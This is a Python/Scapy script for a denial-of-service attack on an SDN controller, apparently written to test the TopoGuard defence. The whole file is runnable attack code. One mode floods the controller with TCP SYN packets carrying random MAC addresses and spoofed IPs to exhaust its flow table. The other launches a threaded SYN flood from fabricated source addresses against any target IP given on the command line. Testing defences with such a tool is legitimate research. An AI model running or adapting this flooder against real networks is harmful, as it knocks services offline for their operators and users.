#!/usr/bin/env python3
"""
DDoS Attack on Controller
Flood the controller with packet-in messages by generating lots of traffic
Tests TopoGuard's ability to handle high load and detect anomalies
"""

from scapy.all import *
import time
import threading
import sys

class DDoSAttacker:
    def __init__(self, target_ip, source_hosts, interface='h1-eth0'):
        self.target_ip = target_ip
        self.source_hosts = source_hosts
        self.interface = interface
        self.running = False
        self.packets_sent = 0
        
    def generate_random_traffic(self, duration=30):
        """Generate random traffic to flood controller"""
        print(f"[*] Generating random traffic for {duration} seconds")
        
        end_time = time.time() + duration
        
        while time.time() < end_time and self.running:
            for src_ip in self.source_hosts:
                # Random destination port to force new flows
                dst_port = RandShort()
                src_port = RandShort()
                
                # TCP SYN flood
                pkt = IP(src=src_ip, dst=self.target_ip) / \
                      TCP(sport=src_port, dport=dst_port, flags='S')
                
                send(pkt, verbose=False)
                self.packets_sent += 1
                
                if self.packets_sent % 100 == 0:
                    print(f"[+] Sent {self.packets_sent} packets")
    
    def packet_in_flood(self, count=1000):
        """
        Send packets with random MACs to trigger packet-in messages
        Each packet forces controller to process and install new flow rules
        """
        print(f"[*] Starting Packet-In Flood Attack")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Packets: {count}")
        print(f"[*] This will stress the controller's flow table...")
        
        self.running = True
        
        for i in range(count):
            # Generate packet with random source MAC
            eth = Ether(src=RandMAC(), dst=RandMAC())
            ip = IP(src=RandIP(), dst=self.target_ip)
            tcp = TCP(sport=RandShort(), dport=80, flags='S')
            
            pkt = eth / ip / tcp
            
            sendp(pkt, iface=self.interface, verbose=False)
            self.packets_sent += 1
            
            if (i+1) % 100 == 0:
                print(f"[+] Flooded {i+1} packet-in messages to controller")
            
            time.sleep(0.01)  # 100 packets/sec
        
        self.running = False
        print(f"[!] Attack completed - {self.packets_sent} packets sent")
        print("[?] Check controller CPU usage and flow table size")

def distributed_ddos(target_ip, attacker_count=5, duration=30):
    """Simulate distributed DDoS from multiple sources"""
    print(f"[*] Starting Distributed DDoS Attack")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Attackers: {attacker_count}")
    print(f"[*] Duration: {duration} seconds")
    
    # Create fake source IPs
    sources = [f"10.0.{i//255}.{i%255}" for i in range(1, attacker_count+1)]
    
    attacker = DDoSAttacker(target_ip, sources)
    attacker.running = True
    
    # Launch attack threads
    threads = []
    for _ in range(attacker_count):
        t = threading.Thread(target=attacker.generate_random_traffic, args=(duration,))
        t.start()
        threads.append(t)
    
    # Wait for completion
    for t in threads:
        t.join()
    
    print(f"[!] Distributed DDoS completed - {attacker.packets_sent} total packets")

if __name__ == "__main__":
    print("=== SDN Controller DDoS Attack ===")
    print("Select attack type:")
    print("1. Packet-In Flood (Flow Table Exhaustion)")
    print("2. Distributed DDoS")
    
    if len(sys.argv) < 3:
        print("\nUsage:")
        print("  Packet-In Flood: python3 ddos_attack.py 1 <target_ip>")
        print("  Distributed DDoS: python3 ddos_attack.py 2 <target_ip>")
        print("\nExample: python3 ddos_attack.py 1 10.0.0.1")
        sys.exit(1)
    
    attack_type = int(sys.argv[1])
    target = sys.argv[2]
    
    try:
        if attack_type == 1:
            attacker = DDoSAttacker(target, ["10.0.0.1"])
            attacker.packet_in_flood(count=500)
        elif attack_type == 2:
            distributed_ddos(target, attacker_count=5, duration=20)
        else:
            print("[!] Invalid attack type")
    except PermissionError:
        print("[!] Error: This script requires root/administrator privileges")
    except Exception as e:
        print(f"[!] Error: {e}")
